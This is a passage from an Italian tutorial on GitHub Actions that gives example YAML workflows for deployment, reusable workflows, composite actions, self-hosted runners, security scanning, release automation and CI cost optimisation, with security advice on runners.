      name: staging
      url: https://staging.mia-app.com
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: app-build
          path: dist/

      - name: Deploy a staging
        env:
          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}  # Secret dell'environment staging
        run: |
          echo "Deploy a staging in corso..."
          rsync -avz dist/ ${{ vars.STAGING_SERVER }}:/var/www/app/

  # Questo job richiede approvazione manuale (configurata nell'environment)
  deploy-production:
    name: Deploy a Produzione
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://www.mia-app.com
    concurrency:
      group: production-deploy
      cancel-in-progress: false
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: app-build
          path: dist/

      - name: Deploy a produzione
        env:
          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}  # Secret dell'environment production
        run: |
          echo "Deploy a produzione in corso..."
          rsync -avz dist/ ${{ vars.PRODUCTION_SERVER }}:/var/www/app/

      - name: Verifica deployment
        run: |
          sleep 30
          HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" https://www.mia-app.com/health)
          if [ "$HTTP_STATUS" != "200" ]; then
            echo "Health check fallito: HTTP $HTTP_STATUS"
            exit 1
          fi
          echo "Deployment verificato con successo"
```

---

## Reusable Workflows

I reusable workflows permettono di definire un workflow una sola volta e richiamarlo da altri workflow, promuovendo il principio DRY (Don't Repeat Yourself).

### Workflow Riusabile (Callee)

```yaml
# .github/workflows/reusable-deploy.yml
name: Reusable Deploy Workflow

on:
  workflow_call:
    inputs:
      environment:
        description: 'Ambiente di deployment'
        required: true
        type: string
      app_version:
        description: 'Versione da deployare'
        required: true
        type: string
      dry_run:
        description: 'Esegui in modalita dry-run'
        required: false
        type: boolean
        default: false
    secrets:
      deploy_token:
        description: 'Token per il deploy'
        required: true
      slack_webhook:
        required: false
    outputs:
      deploy_url:
        description: 'URL del deployment'
        value: ${{ jobs.deploy.outputs.url }}

jobs:
  deploy:
    name: Deploy ${{ inputs.environment }}
    runs-on: ubuntu-latest
    environment:
      name: ${{ inputs.environment }}
    outputs:
      url: ${{ steps.deploy.outputs.deploy_url }}
    steps:
      - uses: actions/checkout@v4

      - name: Configura ambiente
        run: |
          echo "Deploying v${{ inputs.app_version }} to ${{ inputs.environment }}"
          if [ "${{ inputs.dry_run }}" = "true" ]; then
            echo "MODALITA DRY-RUN: nessuna modifica effettiva"
          fi

      - name: Esegui deploy
        id: deploy
        env:
          DEPLOY_TOKEN: ${{ secrets.deploy_token }}
        run: |
          # Logica di deploy
          DEPLOY_URL="https://${{ inputs.environment }}.mia-app.com"
          echo "deploy_url=$DEPLOY_URL" >> $GITHUB_OUTPUT

      - name: Notifica Slack
        if: always() && secrets.slack_webhook != ''
        run: |
          STATUS="${{ job.status }}"
          curl -X POST ${{ secrets.slack_webhook }} \
            -H 'Content-type: application/json' \
            -d "{\"text\":\"Deploy ${{ inputs.environment }} v${{ inputs.app_version }}: $STATUS\"}"
```

### Chiamare un Reusable Workflow (Caller)

```yaml
# .github/workflows/main-pipeline.yml
name: Main Pipeline

on:
  push:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm test

  # Chiamata a workflow riusabile nello stesso repository
  deploy-staging:
    needs: test
    uses: ./.github/workflows/reusable-deploy.yml
    with:
      environment: staging
      app_version: '1.2.3'
    secrets:
      deploy_token: ${{ secrets.STAGING_DEPLOY_TOKEN }}
      slack_webhook: ${{ secrets.SLACK_WEBHOOK }}

  # Chiamata a workflow riusabile in un altro repository
  deploy-production:
    needs: deploy-staging
    uses: mia-org/workflow-templates/.github/workflows/deploy.yml@v2
    with:
      environment: production
      app_version: '1.2.3'
    secrets: inherit  # Passa TUTTI i secrets del caller

  # Uso dell'output del workflow riusabile
  post-deploy:
    needs: deploy-production
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deployato a: ${{ needs.deploy-production.outputs.deploy_url }}"
```

### Limitazioni

- Massimo **4 livelli di nesting** (un workflow riusabile puo' chiamare un altro workflow riusabile, fino a 4 livelli di profondita').
- Un workflow riusabile **non puo' chiamare un altro workflow riusabile dallo stesso file**.
- Le variabili `env` definite nel caller **non vengono propagate** al callee.
- I reusable workflows devono risiedere in un file `.yml` nella directory `.github/workflows/`.

---

## Composite Actions

Le composite actions sono azioni personalizzate che combinano piu' step in un'unica unita' riutilizzabile, definita tramite un file `action.yml`.

### Struttura action.yml

```yaml
# .github/actions/setup-and-build/action.yml
name: 'Setup e Build'
description: 'Configura l ambiente e compila il progetto'
author: 'Team DevOps'

inputs:
  node-version:
    description: 'Versione Node.js da utilizzare'
    required: false
    default: '20'
  build-args:
    description: 'Argomenti aggiuntivi per il build'
    required: false
    default: ''

outputs:
  build-size:
    description: 'Dimensione del build in bytes'
    value: ${{ steps.measure.outputs.size }}
  artifact-path:
    description: 'Percorso dell artifact generato'
    value: ${{ steps.build.outputs.path }}

runs:
  using: 'composite'
  steps:
    - name: Setup Node.js
      uses: actions/setup-node@v4
      with:
        node-version: ${{ inputs.node-version }}
        cache: 'npm'

    - name: Installa dipendenze
      shell: bash
      run: npm ci

    - name: Esegui linter
      shell: bash
      run: npm run lint

    - name: Build progetto
      id: build
      shell: bash
      run: |
        npm run build ${{ inputs.build-args }}
        echo "path=dist/" >> $GITHUB_OUTPUT

    - name: Misura dimensione
      id: measure
      shell: bash
      run: |
        SIZE=$(du -sb dist/ | cut -f1)
        echo "size=$SIZE" >> $GITHUB_OUTPUT
        echo "Dimensione build: $SIZE bytes"
```

**Utilizzo nel workflow:**

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup e Build
        id: build
        uses: ./.github/actions/setup-and-build
        with:
          node-version: '20'
          build-args: '--minify'

      - name: Mostra risultato
        run: |
          echo "Dimensione: ${{ steps.build.outputs.build-size }} bytes"
          echo "Percorso: ${{ steps.build.outputs.artifact-path }}"
```

### Differenze tra i Tipi di Azioni

| Caratteristica          | Composite Action         | Reusable Workflow           | JavaScript Action     | Docker Action         |
|-------------------------|--------------------------|-----------------------------|-----------------------|-----------------------|
| File di definizione     | `action.yml`             | workflow `.yml`             | `action.yml` + JS     | `action.yml` + Dockerfile |
| Dove risiede            | Qualsiasi directory      | `.github/workflows/`       | Qualsiasi directory   | Qualsiasi directory   |
| Come si chiama          | `uses` in uno step       | `uses` in un job           | `uses` in uno step    | `uses` in uno step    |
| Supporta `secrets`      | No (passati via inputs)  | Si (keyword dedicata)      | No (via inputs)       | No (via inputs)       |
| Supporta `services`     | No                       | Si                         | No                    | No                    |
| Supporta `if` per step  | Si                       | Si                         | No (logica interna)   | No (logica interna)   |
| Performance             | Veloce                   | Overhead di job             | Molto veloce          | Lento (build immagine)|
| Pubblicazione Marketplace| Si                      | No                         | Si                    | Si                    |

---

## Self-Hosted Runners

I self-hosted runners permettono di eseguire i workflow su macchine proprie, utile per requisiti specifici di hardware, software, rete o sicurezza.

### Installazione e Configurazione

L'installazione avviene da Settings > Actions > Runners > New self-hosted runner:

```bash
# 1. Scarica il runner (esempio Linux x64)
mkdir actions-runner && cd actions-runner
curl -o actions-runner-linux-x64-2.321.0.tar.gz -L \
  https://github.com/actions/runner/releases/download/v2.321.0/actions-runner-linux-x64-2.321.0.tar.gz
tar xzf ./actions-runner-linux-x64-2.321.0.tar.gz

# 2. Configura il runner
./config.sh --url https://github.com/mia-org/mio-repo \
  --token AABCDEFGHIJKLMNOPQRSTUVWXYZ \
  --name "runner-prod-01" \
  --labels "linux,x64,gpu,production" \
  --work "_work"

# 3. Installa come servizio di sistema
sudo ./svc.sh install
sudo ./svc.sh start

# 4. Verifica stato
sudo ./svc.sh status
```

### Utilizzo nel Workflow

```yaml
jobs:
  gpu-training:
    # Utilizza runner con label specifici
    runs-on: [self-hosted, linux, gpu]
    steps:
      - uses: actions/checkout@v4
      - name: Training modello ML
        run: python train.py --epochs 100 --gpu
```

### Runner Groups

I runner groups permettono di organizzare i runner e controllare quali repository possono utilizzarli. Disponibili a livello organization e enterprise.

### Sicurezza

> **ATTENZIONE:** Non utilizzare **mai** self-hosted runners su repository **pubblici**. Chiunque puo' aprire una pull request e eseguire codice arbitrario sulla vostra infrastruttura. Per repository pubblici, utilizzare esclusivamente i runner hosted da GitHub.

Misure di sicurezza raccomandate:

- Utilizzare runner **ephemeral** (`--ephemeral` flag) che vengono distrutti dopo ogni job.
- Limitare l'accesso ai runner tramite runner groups.
- Non memorizzare credenziali sul runner; utilizzare secrets di GitHub.
- Mantenere aggiornato il software del runner.
- Isolare i runner in reti dedicate.

### Actions Runner Controller (ARC)

Per ambienti Kubernetes, l'**Actions Runner Controller** permette di gestire runner ephemeral in modo automatico:

```yaml
# Helm values per ARC
# helm install arc \
#   --namespace actions-runner-system \
#   oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set-controller

# Runner Scale Set definition
apiVersion: actions.github.com/v1alpha1
kind: AutoscalingRunnerSet
metadata:
  name: production-runners
spec:
  githubConfigUrl: "https://github.com/mia-org"
  githubConfigSecret: github-config-secret
  minRunners: 1
  maxRunners: 20
  template:
    spec:
      containers:
        - name: runner
          image: ghcr.io/actions/actions-runner:latest
          resources:
            requests:
              cpu: "2"
              memory: "4Gi"
            limits:
              cpu: "4"
              memory: "8Gi"
```

---

## Pattern e Ricette CI/CD

### CI Pipeline Base

```yaml
# .github/workflows/ci.yml
# Pipeline CI completa per un progetto Node.js con linting, test e build
name: CI Pipeline

on:
  push:
    branches: [main, develop]
    paths-ignore:
      - '**.md'
      - 'docs/**'
  pull_request:
    branches: [main]

# Cancella esecuzioni precedenti sulla stessa PR
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true

permissions:
  contents: read
  checks: write
  pull-requests: write

jobs:
  lint:
    name: Linting
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'

      - run: npm ci
      - run: npm run lint
      - run: npm run format:check

  test:
    name: Test
    runs-on: ubuntu-latest
    needs: lint
    services:
      postgres:
        image: postgres:16-alpine
        env:
          POSTGRES_PASSWORD: test_pwd
          POSTGRES_DB: app_test
        ports:
          - 5432:5432
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
      redis:
        image: redis:7-alpine
        ports:
          - 6379:6379
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'

      - run: npm ci

      - name: Esegui test unitari
        run: npm run test:unit -- --coverage
        env:
          DATABASE_URL: postgresql://postgres:test_pwd@localhost:5432/app_test
          REDIS_URL: redis://localhost:6379

      - name: Esegui test di integrazione
        run: npm run test:integration
        env:
          DATABASE_URL: postgresql://postgres:test_pwd@localhost:5432/app_test
          REDIS_URL: redis://localhost:6379

      - name: Pubblica report coverage
        if: github.event_name == 'pull_request'
        uses: davelosert/vitest-coverage-report-action@v2

  build:
    name: Build
    runs-on: ubuntu-latest
    needs: test
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'

      - run: npm ci
      - run: npm run build

      - uses: actions/upload-artifact@v4
        with:
          name: build-${{ github.sha }}
          path: dist/
          retention-days: 7
```

### Build e Push Docker

```yaml
# .github/workflows/docker-build.yml
# Build multi-piattaforma e push a GitHub Container Registry
name: Docker Build & Push

on:
  push:
    branches: [main]
    tags: ['v*']
  pull_request:
    branches: [main]

permissions:
  contents: read
  packages: write

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}

jobs:
  build-and-push:
    name: Build e Push Immagine Docker
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Setup Docker Buildx
        uses: docker/setup-buildx-action@v3

      # Necessario per build multi-piattaforma
      - name: Setup QEMU
        uses: docker/setup-qemu-action@v3

      - name: Login a GitHub Container Registry
        if: github.event_name != 'pull_request'
        uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      # Genera tag automatici basati su branch, tag e SHA
      - name: Estrai metadata Docker
        id: meta
        uses: docker/metadata-action@v5
        with:
          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          tags: |
            # Tag "latest" per il branch main
            type=raw,value=latest,enable={{is_default_branch}}
            # Tag dal semver (v1.2.3 -> 1.2.3, 1.2, 1)
            type=semver,pattern={{version}}
            type=semver,pattern={{major}}.{{minor}}
            type=semver,pattern={{major}}
            # Tag dal branch name
            type=ref,event=branch
            # Tag dalla PR
            type=ref,event=pr
            # Tag dallo SHA corto
            type=sha,prefix=sha-

      - name: Build e Push
        uses: docker/build-push-action@v6
        with:
          context: .
          # Build per amd64 e arm64
          platforms: linux/amd64,linux/arm64
          # Push solo se NON e' una PR
          push: ${{ github.event_name != 'pull_request' }}
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          # Cache layers per velocizzare build successive
          cache-from: type=gha
          cache-to: type=gha,mode=max
          build-args: |
            BUILD_DATE=${{ github.event.head_commit.timestamp }}
            VERSION=${{ steps.meta.outputs.version }}
            REVISION=${{ github.sha }}
```

### Deploy con Environments

```yaml
# .github/workflows/deploy.yml
# Pipeline di deploy: staging (automatico) → produzione (con approvazione)
name: Deploy Pipeline

on:
  push:
    branches: [main]
  workflow_dispatch:
    inputs:
      skip_staging:
        description: 'Salta staging e deploya direttamente in produzione'
        type: boolean
        default: false

permissions:
  contents: read
  id-token: write

jobs:
  build:
    name: Build Artifact
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.version.outputs.value }}
    steps:
      - uses: actions/checkout@v4

      - name: Determina versione
        id: version
        run: echo "value=$(git describe --tags --always)" >> $GITHUB_OUTPUT

      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'

      - run: npm ci && npm run build

      - uses: actions/upload-artifact@v4
        with:
          name: deploy-artifact-${{ steps.version.outputs.value }}
          path: dist/

  deploy-staging:
    name: Deploy Staging
    needs: build
    if: inputs.skip_staging != true
    runs-on: ubuntu-latest
    environment:
      name: staging
      url: https://staging.mia-app.com
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: deploy-artifact-${{ needs.build.outputs.version }}
          path: dist/

      - name: Autenticazione AWS via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.AWS_ROLE_ARN }}
          aws-region: eu-west-1

      - name: Deploy a staging
        run: |
          aws s3 sync dist/ s3://${{ vars.S3_BUCKET }}/ --delete
          aws cloudfront create-invalidation \
            --distribution-id ${{ vars.CF_DISTRIBUTION_ID }} \
            --paths "/*"

      - name: Smoke test
        run: |
          sleep 15
          RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" https://staging.mia-app.com)
          if [ "$RESPONSE" != "200" ]; then
            echo "Smoke test fallito: HTTP $RESPONSE"
            exit 1
          fi

  # Richiede approvazione manuale (configurata nell'environment "production")
  deploy-production:
    name: Deploy Produzione
    needs: [build, deploy-staging]
    # Esegui se staging ha avuto successo OPPURE se e' stato saltato
    if: always() && (needs.deploy-staging.result == 'success' || needs.deploy-staging.result == 'skipped')
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://www.mia-app.com
    concurrency:
      group: production-deploy
      cancel-in-progress: false
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: deploy-artifact-${{ needs.build.outputs.version }}
          path: dist/

      - name: Autenticazione AWS via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.AWS_ROLE_ARN }}
          aws-region: eu-west-1

      - name: Deploy a produzione
        run: |
          aws s3 sync dist/ s3://${{ vars.S3_BUCKET }}/ --delete
          aws cloudfront create-invalidation \
            --distribution-id ${{ vars.CF_DISTRIBUTION_ID }} \
            --paths "/*"

      - name: Verifica deployment
        run: |
          sleep 30
          for i in 1 2 3 4 5; do
            RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" https://www.mia-app.com/health)
            if [ "$RESPONSE" = "200" ]; then
              echo "Health check passato al tentativo $i"
              exit 0
            fi
            echo "Tentativo $i fallito (HTTP $RESPONSE), attendo 10 secondi..."
            sleep 10
          done
          echo "Health check fallito dopo 5 tentativi"
          exit 1
```

### Release Automation

```yaml
# .github/workflows/release.yml
# Automazione release: semantic versioning, changelog, GitHub Release
name: Release Automation

on:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: write
  pull-requests: write

jobs:
  release:
    name: Crea Release
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0  # Necessario per analizzare la storia commit

      # Determina il prossimo numero di versione basandosi sui commit convenzionali
      - name: Calcola prossima versione
        id: semver
        uses: mathieudutour/github-tag-action@v6.2
        with:
          github_token: ${{ secrets.GITHUB_TOKEN }}
          default_bump: patch
          # Convezioni: feat: -> minor, fix: -> patch, BREAKING CHANGE: -> major
          release_branches: main
          dry_run: true  # Non creare il tag ancora

      - name: Genera changelog
        id: changelog
        uses: mikepenz/release-changelog-builder-action@v5
        with:
          configuration: |
            {
              "categories": [
                {"title": "## Nuove Funzionalita", "labels": ["feature", "enhancement"]},
                {"title": "## Bug Fix", "labels": ["bug", "fix"]},
                {"title": "## Miglioramenti", "labels": ["improvement", "refactor"]},
                {"title": "## Documentazione", "labels": ["documentation"]},
                {"title": "## Dipendenze", "labels": ["dependencies"]}
              ],
              "template": "#{{CHANGELOG}}\n\n**Full Changelog**: #{{RELEASE_DIFF}}"
            }
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      # Crea il tag e il release solo se ci sono cambiamenti significativi
      - name: Crea tag
        if: steps.semver.outputs.new_version != ''
        id: tag
        uses: mathieudutour/github-tag-action@v6.2
        with:
          github_token: ${{ secrets.GITHUB_TOKEN }}
          custom_tag: ${{ steps.semver.outputs.new_version }}
          release_branches: main

      - name: Crea GitHub Release
        if: steps.tag.outputs.new_tag != ''
        uses: softprops/action-gh-release@v2
        with:
          tag_name: ${{ steps.tag.outputs.new_tag }}
          name: Release ${{ steps.tag.outputs.new_tag }}
          body: ${{ steps.changelog.outputs.changelog }}
          draft: false
          prerelease: false
          generate_release_notes: true
```

### Security Scanning

```yaml
# .github/workflows/security.yml
# Pipeline di sicurezza: CodeQL, dependency review, container scanning
name: Security Scanning

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  schedule:
    # Scansione settimanale il lunedi alle 06:00 UTC
    - cron: '0 6 * * 1'

permissions:
  security-events: write
  contents: read
  pull-requests: read
  actions: read

jobs:
  # Analisi statica del codice con CodeQL
  codeql:
    name: CodeQL Analysis
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        language: ['javascript-typescript', 'python']
    steps:
      - uses: actions/checkout@v4

      - name: Inizializza CodeQL
        uses: github/codeql-action/init@v3
        with:
          languages: ${{ matrix.language }}
          # Queries aggiuntive per maggiore copertura
          queries: +security-and-quality

      - name: Autobuild
        uses: github/codeql-action/autobuild@v3

      - name: Esegui analisi CodeQL
        uses: github/codeql-action/analyze@v3

  # Revisione dipendenze sulle pull request
  dependency-review:
    name: Dependency Review
    runs-on: ubuntu-latest
    if: github.event_name == 'pull_request'
    steps:
      - uses: actions/checkout@v4

      - name: Revisione dipendenze
        uses: actions/dependency-review-action@v4
        with:
          # Blocca PR con vulnerabilita critiche o alte
          fail-on-severity: high
          # Blocca licenze non consentite
          deny-licenses: GPL-3.0, AGPL-3.0

  # Scansione container con Trivy
  trivy-scan:
    name: Trivy Container Scan
    runs-on: ubuntu-latest
    if: github.event_name != 'pull_request'
    steps:
      - uses: actions/checkout@v4

      - name: Build immagine per scansione
        run: docker build -t local-scan:latest .

      - name: Scansione vulnerabilita container
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'local-scan:latest'
          format: 'sarif'
          output: 'trivy-results.sarif'
          severity: 'CRITICAL,HIGH'

      - name: Carica risultati su GitHub Security
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: 'trivy-results.sarif'

  # Scansione secrets nel codice
  secret-scan:
    name: Secret Detection
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Scansione secrets con Gitleaks
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

### Scheduled Tasks

```yaml
# .github/workflows/scheduled.yml
# Task pianificati: pulizia issue stale, aggiornamento dipendenze, report
name: Scheduled Tasks

on:
  schedule:
    # Ogni giorno alle 03:00 UTC
    - cron: '0 3 * * *'
  workflow_dispatch:  # Permetti esecuzione manuale

permissions:
  contents: write
  issues: write
  pull-requests: write

jobs:
  # Chiudi issue e PR inattive
  stale-issues:
    name: Gestione Issue Stale
    runs-on: ubuntu-latest
    steps:
      - uses: actions/stale@v9
        with:
          days-before-stale: 60
          days-before-close: 14
          stale-issue-label: 'stale'
          stale-pr-label: 'stale'
          stale-issue-message: |
            Questa issue e' stata contrassegnata come stale perche non ha ricevuto
            attivita per 60 giorni. Verra chiusa automaticamente tra 14 giorni
            se non ci saranno ulteriori interazioni.
          stale-pr-message: |
            Questa pull request e' stata contrassegnata come stale. Si prega
            di aggiornare o chiudere la PR.
          exempt-issue-labels: 'pinned,security,bug'

  # Aggiornamento automatico dipendenze (alternativa a Dependabot con piu controllo)
  dependency-update:
    name: Aggiornamento Dipendenze
    runs-on: ubuntu-latest
    # Esegui solo il lunedi
    if: github.event.schedule == '0 3 * * 1' || github.event_name == 'workflow_dispatch'
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Aggiorna dipendenze
        run: |
          npm update
          npm audit fix --force || true

      - name: Verifica modifiche
        id: changes
        run: |
          if git diff --quiet package-lock.json; then
            echo "changed=false" >> $GITHUB_OUTPUT
          else
            echo "changed=true" >> $GITHUB_OUTPUT
          fi

      - name: Crea PR con aggiornamenti
        if: steps.changes.outputs.changed == 'true'
        uses: peter-evans/create-pull-request@v7
        with:
          commit-message: 'chore(deps): aggiorna dipendenze'
          branch: deps/auto-update
          title: 'chore(deps): aggiornamento automatico dipendenze'
          body: |
            Aggiornamento automatico delle dipendenze npm.
            Verificare i cambiamenti nel `package-lock.json`.
          labels: dependencies,automated
          delete-branch: true

  # Pulizia cache vecchie
  cache-cleanup:
    name: Pulizia Cache
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Pulisci cache vecchie
        uses: actions/github-script@v7
        with:
          script: |
            const caches = await github.rest.actions.getActionsCacheList({
              owner: context.repo.owner,
              repo: context.repo.repo,
              per_page: 100
            });

            const oneWeekAgo = new Date();
            oneWeekAgo.setDate(oneWeekAgo.getDate() - 7);

            for (const cache of caches.data.actions_caches) {
              const lastAccessed = new Date(cache.last_accessed_at);
              if (lastAccessed < oneWeekAgo) {
                console.log(`Eliminazione cache: ${cache.key} (ultimo accesso: ${cache.last_accessed_at})`);
                await github.rest.actions.deleteActionsCacheById({
                  owner: context.repo.owner,
                  repo: context.repo.repo,
                  cache_id: cache.id
                });
              }
            }
```

### Notification

```yaml
# .github/workflows/notify.yml
# Notifiche Slack e Microsoft Teams in caso di fallimento
name: CI con Notifiche

on:
  push:
    branches: [main]

jobs:
  build:
    name: Build e Test
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test && npm run build

  notify:
    name: Notifica Risultato
    needs: build
    if: always() && needs.build.result == 'failure'
    runs-on: ubuntu-latest
    steps:
      # Notifica Slack
      - name: Notifica Slack
        uses: slackapi/slack-github-action@v2.0.0
        with:
          webhook: ${{ secrets.SLACK_WEBHOOK_URL }}
          webhook-type: incoming-webhook
          payload: |
            {
              "blocks": [
                {
                  "type": "header",
                  "text": {
                    "type": "plain_text",
                    "text": "Build Fallita"
                  }
                },
                {
                  "type": "section",
                  "fields": [
                    {
                      "type": "mrkdwn",
                      "text": "*Repository:*\n${{ github.repository }}"
                    },
                    {
                      "type": "mrkdwn",
                      "text": "*Branch:*\n${{ github.ref_name }}"
                    },
                    {
                      "type": "mrkdwn",
                      "text": "*Commit:*\n${{ github.sha }}"
                    },
                    {
                      "type": "mrkdwn",
                      "text": "*Autore:*\n${{ github.actor }}"
                    }
                  ]
                },
                {
                  "type": "actions",
                  "elements": [
                    {
                      "type": "button",
                      "text": {
                        "type": "plain_text",
                        "text": "Visualizza Workflow"
                      },
                      "url": "${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}"
                    }
                  ]
                }
              ]
            }

      # Notifica Microsoft Teams
      - name: Notifica Teams
        uses: jdcargile/ms-teams-notification@v1.4
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          ms-teams-webhook-uri: ${{ secrets.TEAMS_WEBHOOK_URI }}
          notification-summary: "Build fallita su ${{ github.repository }}"
          notification-color: "dc3545"
          timezone: "Europe/Rome"
```

### Monorepo CI

```yaml
# .github/workflows/monorepo-ci.yml
# CI per monorepo con trigger basati sui path modificati
name: Monorepo CI

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

# Cancella run precedenti sulla stessa PR
concurrency:
  group: monorepo-${{ github.ref }}
  cancel-in-progress: true

jobs:
  # Determina quali package sono stati modificati
  detect-changes:
    name: Rileva Modifiche
    runs-on: ubuntu-latest
    outputs:
      frontend: ${{ steps.filter.outputs.frontend }}
      backend: ${{ steps.filter.outputs.backend }}
      shared: ${{ steps.filter.outputs.shared }}
      infra: ${{ steps.filter.outputs.infra }}
    steps:
      - uses: actions/checkout@v4

      - name: Filtra path modificati
        id: filter
        uses: dorny/paths-filter@v3
        with:
          filters: |
            frontend:
              - 'packages/frontend/**'
              - 'packages/shared/**'
              - 'package.json'
            backend:
              - 'packages/backend/**'
              - 'packages/shared/**'
              - 'package.json'
            shared:
              - 'packages/shared/**'
            infra:
              - 'infra/**'
              - 'docker-compose*.yml'
              - 'Dockerfile*'

  # CI Frontend (solo se modificato)
  frontend-ci:
    name: Frontend CI
    needs: detect-changes
    if: needs.detect-changes.outputs.frontend == 'true'
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: packages/frontend
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'

      - run: npm ci --workspace=packages/frontend --workspace=packages/shared
        working-directory: .  # Installa dalla root per i workspace

      - run: npm run lint
      - run: npm run test
      - run: npm run build

  # CI Backend (solo se modificato)
  backend-ci:
    name: Backend CI
    needs: detect-changes
    if: needs.detect-changes.outputs.backend == 'true'
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: packages/backend
    services:
      postgres:
        image: postgres:16-alpine
        env:
          POSTGRES_PASSWORD: test
          POSTGRES_DB: app_test
        ports:
          - 5432:5432
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'

      - run: npm ci --workspace=packages/backend --workspace=packages/shared
        working-directory: .

      - run: npm run lint
      - run: npm run test
        env:
          DATABASE_URL: postgresql://postgres:test@localhost:5432/app_test
      - run: npm run build

  # CI Infrastructure (solo se modificata)
  infra-ci:
    name: Infra Validation
    needs: detect-changes
    if: needs.detect-changes.outputs.infra == 'true'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Validate Docker Compose
        run: docker compose -f docker-compose.yml config --quiet

      - name: Lint Dockerfile
        uses: hadolint/hadolint-action@v3.1.0
        with:
          dockerfile: Dockerfile

  # Gate finale che verifica tutti i check obbligatori
  ci-status:
    name: CI Status Check
    if: always()
    needs: [detect-changes, frontend-ci, backend-ci, infra-ci]
    runs-on: ubuntu-latest
    steps:
      - name: Verifica stato CI
        run: |
          echo "Frontend: ${{ needs.frontend-ci.result }}"
          echo "Backend: ${{ needs.backend-ci.result }}"
          echo "Infra: ${{ needs.infra-ci.result }}"

          # Fallisci se qualche job obbligatorio ha fallito
          # (skipped e' OK perche significa che non e' stato modificato)
          if [[ "${{ needs.frontend-ci.result }}" == "failure" ]] || \
             [[ "${{ needs.backend-ci.result }}" == "failure" ]] || \
             [[ "${{ needs.infra-ci.result }}" == "failure" ]]; then
            echo "Uno o piu check CI hanno fallito"
            exit 1
          fi
          echo "Tutti i check CI sono passati"
```

---

## Ottimizzazione e Costi

### Minuti Gratuiti per Piano

| Piano           | Minuti/mese (privati) | Storage artifacts | Moltiplicatore macOS | Moltiplicatore Windows |
|-----------------|----------------------|-------------------|---------------------|----------------------|
| Free            | 2.000                | 500 MB            | x10                  | x2                   |
| Team            | 3.000                | 2 GB              | x10                  | x2                   |
| Enterprise      | 50.000               | 50 GB             | x10                  | x2                   |

> **Nota:** I repository **pubblici** hanno minuti illimitati gratuiti su tutti i piani.

Il moltiplicatore indica che 1 minuto su macOS costa come 10 minuti su Linux. Pertanto, utilizzare macOS solo quando strettamente necessario (test su iOS/macOS, build Xcode).

### Strategie per Ridurre i Minuti

**1. Caching aggressivo:**
Il caching delle dipendenze puo' ridurre i tempi di esecuzione del 50-80%. Utilizzare sempre `actions/cache` o il parametro `cache` integrato nelle actions di setup.

**2. Concurrency con cancel-in-progress:**
```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```
Questo annulla le esecuzioni obsolete quando un nuovo push viene effettuato sulla stessa PR, evitando spreco di minuti.

**3. Path filters:**
Non eseguire l'intera CI quando vengono modificati solo file di documentazione:
```yaml
on:
  push:
    paths-ignore:
      - '**.md'
